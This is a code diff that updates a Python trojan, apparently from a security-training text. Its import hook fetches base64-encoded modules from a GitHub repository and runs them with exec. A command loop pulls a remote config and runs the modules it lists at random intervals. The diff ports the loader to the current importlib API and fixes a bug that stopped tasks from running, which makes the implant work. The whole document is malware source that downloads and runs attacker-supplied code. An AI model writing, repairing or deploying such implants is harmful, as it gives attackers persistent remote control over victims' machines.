@@ -1,5 +1,4 @@
 import base64
-import datetime
 import importlib
 import json
 import random
@@ -7,26 +6,28 @@ import sys
 import threading
 import time
 import github3
+from datetime import datetime
 
 class GitImporter:
     def __init__(self):
         self.current_module_code = ""
 
-    def find_module(self, name, path=None):
-        print("[*] Attempting to retrieve %s" % name)
+    def find_spec(self, name, path=None, target=None):
+        print(f"[*] Attempting to retrieve {name}")
         self.repo = github_connect()
         new_library = get_file_contents('modules', f'{name}.py', self.repo)
-        
+
         if new_library is not None:
             self.current_module_code = base64.b64decode(new_library)
-            return self
-        
-    def load_module(self, name):
-        spec = importlib.util.spec_from_loader(name, loader = None, origin=self.repo.git_url)
-        new_module = importlib.util.module_from_spec(spec)
-        exec(self.current_module_code, new_module.__dict__)
-        sys.modules[spec.name] = new_module
-        return new_module
+            return importlib.util.spec_from_loader(name, loader=self)
+
+        return None
+    
+    def create_module(self, spec):
+        return None  # Use default module creation
+
+    def exec_module(self, module):
+        exec(self.current_module_code, module.__dict__)
 
 class Trojan:
     def __init__(self, id):
@@ -40,7 +41,7 @@ class Trojan:
         config = json.loads(base64.b64decode(config_json))
         for task in config:
             if task['modules'] not in sys.modules:
-                exec("import %s" % task['modules'])
+                importlib.import_module(task['modules'])
         return config
     
     def module_runner(self, module):
@@ -57,7 +58,7 @@ class Trojan:
         while True:
             config = self.get_config()
             for task in config:
-                thread = threading.Thread(target = self.module_runner, args = (task['module'],))
+                thread = threading.Thread(target = self.module_runner, args = (task['modules'],))
                 thread.start()
                 time.sleep(random.randint(1, 10))
             time.sleep(random.randint(30*60, 3*60*60))
@@ -74,6 +75,5 @@ def get_file_contents(dirname, module_name, repo):
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
-    # print(sys.meta_path)
     trojan = Trojan('abc')
     trojan.run()
